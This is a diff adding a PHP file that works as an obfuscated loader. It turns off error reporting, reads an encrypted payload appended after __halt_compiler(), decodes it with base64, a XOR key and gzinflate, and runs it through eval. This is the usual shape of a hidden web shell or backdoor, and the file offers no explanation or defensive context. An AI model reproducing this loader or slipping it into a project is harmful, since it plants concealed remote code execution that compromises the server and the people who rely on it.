@@ -1,0 +1,17 @@
+<?php
+@error_reporting(0);
+function xor_decipher($data, $key) {
+    $keyLen = strlen($key);
+    $output = '';
+    for ($i = 0; $i < strlen($data); $i++) {
+        $output .= $data[$i] ^ $key[$i % $keyLen];
+    }
+    return $output;
+}
+$key = 'kecil';
+$payload = substr(file_get_contents(__FILE__), __COMPILER_HALT_OFFSET__);
+$decoded_b64 = base64_decode($payload); 
+$decrypted_xor = xor_decipher($decoded_b64, $key); 
+$code = gzinflate($decrypted_xor);
+eval('?>' . $code);
+__halt_compiler();1jI6Oo4zcR33kn7pJiTMD5HlrEpmpGGtfK3TQglu2sg3/0dv1zZ7ukWamPX3a2ZrX7Fkhui38Jb5jEX6BNjy/qzVipnj41aybCQL8yeKO+woQFcEwDPDDu+IILckxcptnUXGdDMSbvXOD75pjWKgN4r7lfFXYHkmTnDNuBdtg/Qdliy3xzAp0oZmLEVOyE/SpxnN6Nr6P59GFJd6kGhBQAoYh09igwjN3ADkctX/B+5ZJDJqXP+qHqQSD1NU3cVqBsBcXf+1NYJKIoji7ao8kCjT7nvRmyDcNEsamwO1tkaVQZ/EtzcT/zDK4RFoghehARJuMvl9Mwgw92VBGY4x9tCugw8WXUrDPgoLl1Kv5mheTvbxAUL5pWXBZiTS3qKaojHy0I4ipLWU80ueO/YnzR6nwb4Eod65QIurkoQ+rgHeXAjDWy6hVOzupVhS1U8z3bpYFcVVsU2edeAR9HOBPIhvoPA6NDyf796FrzG1udkCGtgzw7yVHi+FWrUN8zlGo8W43kHjGfCZvZvadkWHIHSOwoJD1EHDpYkART71ZMFUN/JBIHsgV4pvXDRp+cBmzf9BE597eIa/0tN6EV4pvDgB92dggJhQ7DbIxUYOwRdb9GgZkI6rhExKIGdGF087UlOzPGsfIZGuEQDvovOTvpDSw+M5RfQ57y8X/yaTa+GghlNkHoNI/pOOzMpY+MFos6xA1QOfZnHEMoYReGMp3r3FbzaRn2GBgY89SYLfa5x0qr+rb+/qGwfY/8BiujZ+GkYSKJqwZjwVbXo9ISyODtY70t0pS7133WefSkJBGWMLjoShxFaMzMlFL1IVAMqy54jzp+C2hFWMRNFEql7dXAGy+ji3x3BqF4f2LIglVFNIKNqDKCVGEuLCSxdSBWqN06+JvTH+YLhz2wwGAyxWPw4EhkscWaGFnOQvm5KBg+LKt5fllFWIRErjRE3w8a+LtLUDGZjX+u4r4d/ltN9XqK+32jC+peWbBjH1R4ofjUGb/1tMhUVIisq6zluBdedqeTsNHGDAtyIomDKbtsWldVEyAgY/CFSBSkzrZ57vsaZKOOSIcOz5Ws0oppPxyBMurfuuLrK6cmtDKPCWFTs8OWxSReNPYBcL+U5ur6Y7AuB5Ku7Ibwgzgctwq1hnBQ8Bo59us2qPT1honTu2F2B1Ubqb8LcTeYOr7pnMNb5ljXtKIXxATxG0Y7R3L5uHUAuMIcBupfDMXoieXZ3h0yrr40azdhWZ0t9MnBXZsGR0SWDyOrhVKuSy+tJ4yHkJSRENbUF8SCKsZnXZReNogjmaAkdpi/+zdozwKypxm3eGe1hPElQaxh424UyXJFnh0S8Hrzbd5QMzzLOSq04D0T7KeQulsjNTsSJQ7fVgFzb/+j8o81k6XuP3iUJXYSTw7hk40Jf4hmwUBZ+dKZeQtroGfUVQvwuy5VG23gE1/g0MvGpy60iyA0COWjDqDpTdgQcU3j/BHcT24a4sDH1+ZuFDTsFnPYS41MmaAinNZtog6CBq120/ZoshQ104yEpV14FppJ+mvKHy1MGZW0ALmwKnF941iuH6tZNRsQ9vnff9NJLjQzvIkp+NbcsdN+cL0VyaN3/SVo8QYl15lvS0xLAOBQITeqOMUR6TKFMiamBnBdSLK+7jVyeK69hYrZRv+QJ5TjTRPDivBzj5DxsTPWRke5jqYcRNO3cL0dVBtXPRa51Ho09RG20NFNgqyy3OuIeL3CGXtkmKQVNs3RR80GuZgYdMW6s8NJO/UePOtZKCHl3DG1lestuOYYuRcJAgBAKnNnKQrkgeMJyXRg==
